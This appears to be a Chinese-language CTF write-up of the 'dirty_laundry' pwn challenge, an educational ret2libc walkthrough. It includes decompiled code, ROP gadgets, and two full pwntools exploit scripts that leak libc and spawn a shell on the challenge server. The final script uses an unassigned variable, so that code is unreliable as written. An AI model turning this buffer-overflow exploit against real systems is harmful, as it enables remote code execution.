---
title: pragyanCTF - dirty_laundry
categories: [ctf2026, pragyanCTF]
tags: [pwn, ret2libc]
toc: false
---

没有防护，直接栈溢出
```
pwndbg> checksec
File:     /ctf/pragyan26/dirty_laundry/chal
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  check_status(0);
  puts("--- Laundromat v2.0 ---");
  vuln();
  return 0;
}
```
```c
int vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("The washing machine is running...");
  printf("Add your laundry: ");
  read(0, buf, 0x100u);
  return printf("Laundry complete");
}
```
其中有一个比较奇怪的函数：
```c
int __fastcall check_status(int a1)
{
  int result; // eax

  if ( a1 == -1017233057 )
    return puts("Congratulations... jk...");
  return result;
}
```
后续用ROPgadgat查看的时候发现:
```
(venv14) woc@myarch:/ctf/pragyan26 $ ROPgadget --binary ./dirty_laundry/chal --only "pop|ret"
Gadgets information
============================================================
0x00000000004011a8 : pop r14 ; ret
0x000000000040113d : pop rbp ; ret
0x00000000004011a7 : pop rdi ; pop r14 ; ret
0x00000000004011a9 : pop rsi ; ret
0x000000000040101a : ret
0x0000000000401042 : ret 0x2f
```
其中`pop rdi; pop r14; ret`就位于check_status函数中:
```
.text:0000000000401199                         check_status    proc near               ; CODE XREF: main+E↓p
.text:0000000000401199
.text:0000000000401199                         var_4           = dword ptr -4
.text:0000000000401199
.text:0000000000401199                         ; __unwind {
.text:0000000000401199 55                                      push    rbp
.text:000000000040119A 48 89 E5                                mov     rbp, rsp
.text:000000000040119D 48 83 EC 10                             sub     rsp, 10h
.text:00000000004011A1 89 7D FC                                mov     [rbp+var_4], edi
.text:00000000004011A4 81 7D FC 5F 41 5E C3                    cmp     [rbp+var_4], 0C35E415Fh
.text:00000000004011AB 75 0F                                   jnz     short loc_4011BC
.text:00000000004011AD 48 8D 05 54 0E 00 00                    lea     rax, s          ; "Congratulations... jk..."
.text:00000000004011B4 48 89 C7                                mov     rdi, rax        ; s
.text:00000000004011B7 E8 74 FE FF FF                          call    _puts
```
原来这个函数是出题人为了降低难度而有意构造的gadget，同时也说明ROPgadget查找的时候也并不局限于固有的指令，如果合适，也可以将一些二进制数据“拆开”利用。

之前在写noteplus的时候，我已经发现了在docker环境内部挂gdbserver，然后在宿主机同时用pwndbg调试、用python脚本交互的方法。这一题不需要docker，想要实现“调试 + 脚本交互”应该会更简单，查阅资料后得知pwntools中的gdb模块就可以胜任：
```python
from pwn import *

def debug():
    context.binary = elf = ELF("./chal")
    context.terminal = ["tmux", "splitw", "-h"]   # 或者 ["kitty", "@", "launch", "--type=os-window"]
    gdbscript = """
    set pagination off
    b main
    b system
    c
    """
    p = gdb.debug([elf.path], gdbscript=gdbscript)  # 等价于：gdb -q ./chal 并执行上面脚本
    return p

# p = process('./chal')
# p = remote("dirty-laundry.ctf.prgy.in", 1337, ssl=True) # ncat --ssl ，有加密，这里需要设置ssl=True选项
p = debug()
context.binary = elf = ELF("./chal", checksec=False)
# libc = ELF("./libc.so.6.bk", checksec=False)
libc = ELF("/lib64/libc.so.6")    # debug用

binsh_off = next(libc.search(b"/bin/sh\x00"))   # 这是 libc 内的偏移/静态地址

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
puts_base_addr = libc.symbols["puts"]
system_basea_addr = libc.symbols["system"]
again_addr = 0x401217   # NOTE: 因为破坏了指针，所以后续的ret点也有要求，要在vuln()外侧

def fill_rdi(val, ret_addr):
    return p64(0x4011a7) + p64(val) + p64(0) + p64(ret_addr)

def fill_rsi(val, ret_addr):
    return p64(0x4011a9) + p64(val) + p64(ret_addr)

def leak_libc(p):
    payload = b'a' * 0x48 + fill_rdi(puts_got, puts_plt) + p64(again_addr)
    p.recvuntil(b'Add your laundry: ')
    p.sendline(payload)
    p.recvuntil(b'Laundry complete')
    x = p.recvuntil(b'---')[:-4]
    print(x)
    puts_addr = u64(x + b'\x00'*(8-len(x))) # lead puts puts_addr
    print(f'puts addr: {hex(puts_addr)}')
    libc_addr = puts_addr - puts_base_addr
    print(f'libc addr: {hex(libc_addr)}')
    return libc_addr

def exploit(p, system_addr, binsh_addr):
    payload = b'\x40' * 0x48 + fill_rdi(binsh_addr, system_addr) 
    p.recvuntil(b'Add your laundry: ')
    p.sendline(payload)
    p.interactive()

libc_addr = leak_libc(p)
system_addr = libc_addr + system_basea_addr
binsh_addr = libc_addr + binsh_off

print('-- leak complete --')
print(hex(libc_addr))
print(hex(binsh_addr))
print(hex(system_addr))

input('press to continue...')

exploit(p, system_addr, binsh_addr)
```

> 这里有一个细节，因为我们通过溢出覆盖返回地址的时候，会破坏栈上的的rbp备份。而函数内部使用rbp指针来访问栈上数据的,第一次溢出后，执行vuln()末尾的`leave-ret`会使rbp指向错误的位置，此时我们需要有意地控制返回的地址，比如返回到main函数的头部：
```c
.text:0000000000401217                         main            proc near               ; DATA XREF: _start+18↑o
.text:0000000000401217                         ; __unwind {
.text:0000000000401217 55                                      push    rbp
.text:0000000000401218 48 89 E5                                mov     rbp, rsp
```
这样就立刻用rsp来覆盖错误的rbp，不会影响后续的流程。
{: .prompt-warning}


本地打通后准备远程，换题目附件的libc，但是运行的时候调试出现问题：
```
Add your laundry: Laundry completeFatal glibc error: ../stdlib/strtod_l.c:1071 (____strtold_l_internal): assertion failed: lead_zero <= (base == 16 ? (uintmax_t) INTMAX_MAX / 4 : (uintmax_t) INTMAX_MAX)
```
```
Breakpoint 1, 0x000000000040121b in main ()
(gdb) c
Continuing.

Breakpoint 1, 0x000000000040121b in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f964714a675 in do_system (
    line=0x7f96472a6ea4 "/bin/sh")
    at ../sysdeps/posix/system.c:117
117	  DO_LOCK ();
(gdb) disassemble
Dump of assembler code for function do_system:
   0x00007f964714a610 <+0>:	push   %r14
   0x00007f964714a612 <+2>:	movq   %rdi,%xmm2
   0x00007f964714a617 <+7>:	mov    $0x1,%edx
   0x00007f964714a61c <+12>:	push   %r12
   0x00007f964714a61e <+14>:	push   %rbp
   0x00007f964714a61f <+15>:	push   %rbx
   0x00007f964714a620 <+16>:	sub    $0x398,%rsp
   0x00007f964714a627 <+23>:	mov    %fs:0x28,%rax
   0x00007f964714a630 <+32>:	mov    %rax,0x388(%rsp)
   0x00007f964714a638 <+40>:	lea    0x15c862(%rip),%rax        # 0x7f96472a6ea1
   0x00007f964714a63f <+47>:	movl   $0xffffffff,0x18(%rsp)
   0x00007f964714a647 <+55>:	movq   $0x1,0x190(%rsp)
   0x00007f964714a653 <+67>:	movl   $0x0,0x218(%rsp)
   0x00007f964714a65e <+78>:	movq   $0x0,0x198(%rsp)
   0x00007f964714a66a <+90>:	movq   %rax,%xmm1
   0x00007f964714a66f <+95>:	xor    %eax,%eax
   0x00007f964714a671 <+97>:	punpcklqdq %xmm2,%xmm1
=> 0x00007f964714a675 <+101>:	movaps %xmm1,(%rsp)
   0x00007f964714a679 <+105>:	lock cmpxchg %edx,0x195edf(%rip)        # 0x7f96472e0560 <lock>
```
在执行movaps的时候出现了问题，猜测是rsp没有对齐导致的，所以需要准备额外的single-ret-gadget来调整。

最后版本：
```python
from pwn import *

libc = ELF("./dirty_laundry/libc.so.6", checksec=False)
ld_path  = './dirty_laundry/ld-2.35.so'
libc_dir = os.path.abspath('./dirty_laundry')
elf      = ELF("./dirty_laundry/chal", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

gdbscript = r"""
set pagination off
set breakpoint pending on
set auto-solib-add on
b *0x4011d1
b *0x4011e5
b *0x401216
b __stack_chk_fail
c
"""

def debug():
    # 关键：由我们自己决定用哪个 ld + library-path 启动
    p = process([ld_path, "--library-path", libc_dir, elf.path])

    # 再 attach，这时 mappings 已经确定是那套 glibc 了
    gdb.attach(p, gdbscript=gdbscript)
    return p

# p = debug()
p = remote("dirty-laundry.ctf.prgy.in", 1337, ssl=True)
# p = process(elf.path, env={"LD_PRELOAD": libc.path})

binsh_off = next(libc.search(b"/bin/sh\x00"))   # 这是 libc 内的偏移/静态地址

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

puts_base_addr = libc.symbols["puts"]
system_basea_addr = libc.symbols["system"]

again_addr = 0x401217   # NOTE: 因为破坏了指针，所以后续的ret点也有要求，要在vuln()外侧

def fill_rdi(val, ret_addr):
    return p64(0x4011a7) + p64(val) + p64(0) + p64(ret_addr)

def fill_rsi(val, ret_addr):
    return p64(0x4011a9) + p64(val) + p64(ret_addr)


def leak_libc(p):
    payload = b'\x40' * 0x40 + p64(0) + fill_rdi(puts_got, single_ret_gadget) + p64(puts_plt) + p64(again_addr)

    p.recvuntil(b'Add your laundry: ')
    p.sendline(payload)
    p.recvuntil(b'Laundry complete')
    p.recvuntil(b'---')[:-4]
    puts_addr = u64(x + b'\x00'*(8-len(x))) # lead puts puts_addr
    print(f'puts addr: {hex(puts_addr)}')
    print(f'puts base addr: {hex(puts_base_addr)}')
    libc_addr = puts_addr - puts_base_addr
    print(f'libc addr: {hex(libc_addr)}')
    return libc_addr
    
single_ret_gadget = 0x40101a

def exploit(p, system_addr, binsh_addr):
    payload = b'\x40' * 0x40 + p64(0) + fill_rdi(binsh_addr, system_addr) + p64(again_addr)
    x = p.recvuntil(b'Add your laundry: ', timeout=3)
    # x = p.recv(timeout=3)
    print(x)
    p.sendline(payload)
    p.interactive()


libc_addr = leak_libc(p)
system_addr = libc_addr + system_basea_addr
binsh_addr = libc_addr + binsh_off

print('-- leak complete --')
print(hex(libc_addr))
print(hex(binsh_addr))
print(hex(system_addr))

exploit(p, system_addr, binsh_addr)
```
总结：pwntools中设置gdb调试+指定libc/ld的方法：
1. 设置context.terminal
2. 用process启动程序的时候，用ld发起，并使用参数列表：`[ld_path, "--library-path", libc_dir, elf.path]`